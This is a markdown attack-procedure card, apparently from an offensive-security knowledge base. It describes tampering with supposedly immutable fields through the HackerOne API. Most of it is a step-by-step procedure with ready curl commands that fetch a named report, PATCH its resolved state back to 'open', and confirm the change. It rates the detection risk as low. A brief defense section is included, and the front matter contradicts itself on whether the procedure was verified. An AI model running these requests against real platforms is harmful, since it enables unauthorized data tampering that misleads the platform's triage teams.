---
id: proc-maid-api-hackerone
tags:
  - maid
  - data-tampering
  - api
  - web
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-patch-report]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Stored Data Manipulation]]'
updated_at: '2025-12-14T17:24:48.189Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Stored Data Manipulation]]'
---
# Modify-Assumed-Immutable-Data-via-API-Manipulation

## Summary

This procedure exploits a Modification of Assumed-Immutable Data (MAID) vulnerability by manipulating API requests to alter fields that the application assumes cannot be changed post-creation, such as report statuses on the HackerOne platform. It enables unauthorized data tampering, potentially reopening resolved reports or modifying sensitive metadata.

## Description

In the context of the HackerOne platform, certain data like report resolution status is designed to be immutable after initial submission or triage. However, due to insufficient server-side validation, attackers with authenticated access can bypass client-side restrictions using direct API calls. This leads to integrity violations, such as falsifying report states, which could mislead triage teams or extend vulnerability exposure. The attack requires an authenticated session but no elevated privileges, making it feasible for standard users. Expected outcomes include successful data alteration without immediate detection, rated at medium severity (CVSS 4.6). Prerequisites include a valid HackerOne account and tools for request interception.

## Requirements

1. Authenticated HackerOne session with report access
2. Proxy tool like Burp Suite for request manipulation
3. Knowledge of target API endpoints (e.g., /reports/{id})

## Defense

Defensive measures and detection strategies:

- Implement strict server-side immutability checks on critical fields
- Use API versioning and input validation to reject unexpected modifications
- Monitor audit logs for anomalous PATCH requests to report endpoints
- Rate-limit API calls and enforce role-based access controls

## Objectives

1. Tamper with assumed-immutable data to alter report integrity
2. Demonstrate bypass of client-side protections
3. Assess potential for broader platform disruption

## Instructions

### Step 1: Authenticate and Intercept Baseline Request

**Context**: Log in to HackerOne and navigate to a target report to capture the normal API interaction, identifying immutable fields in the response.

**Command** ([[commands/curl-get-report]]):
```bash
curl -X GET 'https://hackerone.com/reports/1139535' \
  -H 'Authorization: Bearer YOUR_TOKEN'
```

> This retrieves the report JSON, revealing fields like "state": "resolved". Note any read-only indicators in the UI.

### Step 2: Modify and Replay Request

**Context**: Use a proxy to alter the request payload, targeting the immutable field, and send a PATCH to enforce the change.

**Command** ([[commands/curl-patch-report]]):
```bash
curl -X PATCH 'https://hackerone.com/reports/1139535' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"state": "open"}'
```

> The server processes the update if validation is lacking, returning updated JSON. Verify via GET request.

### Step 3: Validate Tampering

**Context**: Refresh the report or query again to confirm persistence of the modification.

**Command** ([[commands/curl-get-report]]):
```bash
curl -X GET 'https://hackerone.com/reports/1139535' \
  -H 'Authorization: Bearer YOUR_TOKEN'
```

> Look for the altered "state" value in the output, indicating successful MAID exploitation.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Stored Data Manipulation]]

### Sub-Techniques


## Commands Used

- [[commands/curl-get-report]]
- [[commands/curl-patch-report]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[maid]]
- [[data-tampering]]
- [[api-manipulation]]
